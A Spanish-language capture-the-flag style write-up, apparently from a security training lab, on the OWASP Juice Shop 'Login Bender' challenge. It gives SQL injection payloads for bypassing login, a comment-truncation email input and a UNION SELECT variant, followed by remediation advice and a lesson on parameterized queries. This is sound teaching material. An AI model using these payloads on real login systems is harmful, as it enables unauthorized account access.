# Login Bender

| Campo | Valor |
|-------|-------|
| **Challenge** | Login Bender |
| **Categoría** | Injection |
| **Dificultad** | 3 (Hard) |

## Descripción de la Vulnerabilidad

El challenge consiste en iniciar sesión como Bender. Conociendo el email de Bender (`bender@juice-sh.op`), se puede usar SQL Injection para bypass de autenticación, pero el payload requiere una técnica ligeramente diferente debido a la estructura de la consulta.

## Técnica / Payload Utilizado

1. Identificar el email de Bender: `bender@juice-sh.op`
2. En la página de login:
   - Email: `bender@juice-sh.op'--`
   - Password: cualquier cosa (ej. `a`)
3. El payload comenta el resto de la consulta SQL después del email, eliminando la verificación de contraseña
4. Alternativa con UNION SELECT:
   - Email: `' UNION SELECT id, email, password, '1', '1', '1', '1', '1', '1', '1' FROM Users WHERE email='bender@juice-sh.op'--`
   - Password: cualquier cosa

## Evidencia

El sistema inicia sesión como Bender. La inyección SQL altera la consulta para que ignore la verificación de contraseña o retorne directamente los datos del usuario Bender.

## Remediation

- Usar consultas parametrizadas / prepared statements en todas las consultas SQL
- Implementar un ORM para abstraer el acceso a datos
- Sanitizar y validar inputs en el servidor
- No revelar información sobre la estructura de la base de datos en mensajes de error

## Lección Aprendida

Las variantes de SQL Injection dependen de la estructura de la consulta y del manejador de base de datos. Los comentarios SQL (`--`, `#`, `/* */`) son poderosos para truncar consultas. La única defensa real son las consultas parametrizadas.

---

> Writeup generado para OWASP JuiceShop — Lab de ciberseguridad TARS